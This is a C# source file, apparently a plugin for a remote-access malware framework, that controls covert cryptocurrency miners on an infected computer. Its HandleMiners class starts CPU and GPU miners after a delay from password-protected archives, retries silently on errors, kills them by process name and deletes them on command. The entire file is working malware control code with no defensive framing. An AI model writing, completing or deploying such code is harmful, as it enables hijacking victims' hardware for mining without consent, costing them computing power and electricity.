using MessagePackLib.MessagePack;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Plugin.Handle
{
    class HandleMiners
    {
        internal void StartCPU(MsgPack unpack_msgpack, string cpuBin, string cpuWorkDir, string cpuProc, string cpuZipPass, string cpu_idParameters, string cpuParametrs, string cpuDelay)
        {
            try
            {
                Cpu_Del.Get(cpuBin, cpuProc, cpuWorkDir, cpuZipPass, cpu_idParameters, cpuParametrs, cpuDelay);
            }
            catch
            {
                return;
            }



            try
            {

                for (int i = 0; i < Convert.ToInt32(cpuDelay); i++)
                {
                    Thread.Sleep(1000);
                }

                Cpu_Install.Run(unpack_msgpack, cpuBin, cpuWorkDir, cpuProc, cpuZipPass, cpuParametrs); //Run the miner class
            }
            catch
            {
                Thread.Sleep(500);
                Cpu_Install.Run(unpack_msgpack, cpuBin, cpuWorkDir, cpuProc, cpuZipPass, cpuParametrs); // Run the miner class
            }
        }

        internal void StopCPU(string cpuBin, string cpuProc, string cpu_idParameters)
        {
            if (File.Exists(cpuBin))
                foreach (Process p in Process.GetProcessesByName(cpuProc))
                {
                    cpu_idParameters = "0";
                    p.Kill();
                }

            Thread.Sleep(3000);
        }

        internal void DelCPU(string cpuBin, string cpuProc, string cpuWorkDir, string cpuZipPass, string cpu_idParameters, string cpuParametrs, string cpuDelay)
        {
            Cpu_Del.Get(cpuBin, cpuProc, cpuWorkDir, cpuZipPass, cpu_idParameters, cpuParametrs, cpuDelay);
        }

        internal void StartGPU(MsgPack unpack_msgpack, string gpuBin, string gpuWorkDir, string gpuProc, string gpuZipPass, string gpu_idParameters, string gpuParametrs, string gpuDelay)
        {

            try
            {
                Gpu_Del.Get(gpuBin, gpuProc, gpuWorkDir, gpuZipPass, gpu_idParameters, gpuParametrs, gpuDelay);
            }
            catch
            {
                return;
            }

            try
            {
                for (int i = 0; i < Convert.ToInt32(gpuDelay); i++)
                {
                    Thread.Sleep(1000);
                }
                Gpu_Install.Run(unpack_msgpack, gpuBin, gpuWorkDir, gpuProc, gpuZipPass, gpuParametrs, "");
            }
            catch
            {
                Thread.Sleep(500);
                Gpu_Install.Run(unpack_msgpack, gpuBin, gpuWorkDir, gpuProc, gpuZipPass, gpuParametrs, "");
            }
        }

        internal void StopGPU(string gpuBin, string gpuProc, string gpu_idParameters)
        {
            if (File.Exists(gpuBin))
                foreach (Process p in Process.GetProcessesByName(gpuProc))
                {
                    gpu_idParameters = "0";
                    p.Kill();
                }

        }

        internal void DelGPU(string gpuBin, string gpuProc, string gpuWorkDir, string gpuZipPass, string gpu_idParameters, string gpuParametrs, string gpuDelay)
        {
            try
            {
                Gpu_Del.Get(gpuBin, gpuProc, gpuWorkDir, gpuZipPass, gpu_idParameters, gpuParametrs, gpuDelay);
            }
            catch
            {
                return;
            }
        }
    }
}
